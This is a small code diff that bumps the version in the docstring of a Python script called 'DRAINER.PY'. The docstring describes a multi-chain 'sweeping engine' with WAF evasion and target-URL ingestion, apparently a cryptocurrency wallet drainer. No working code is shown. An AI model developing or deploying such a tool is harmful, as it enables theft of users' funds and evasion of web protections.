@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-DRAINER.PY v8.0 — Active Multi-Chain Liquidity Auditor & Sweeping Engine (Hardened with WAF Evasion)
+DRAINER.PY v8.5 — Active Multi-Chain Liquidity Auditor & Sweeping Engine (Hardened with WAF Evasion)
 Features:
 - Dynamic multi-target URL ingestion (Zero hardcoded domains)
 - Full multi-chain support (Ethereum, Solana, Bitcoin, Tron)
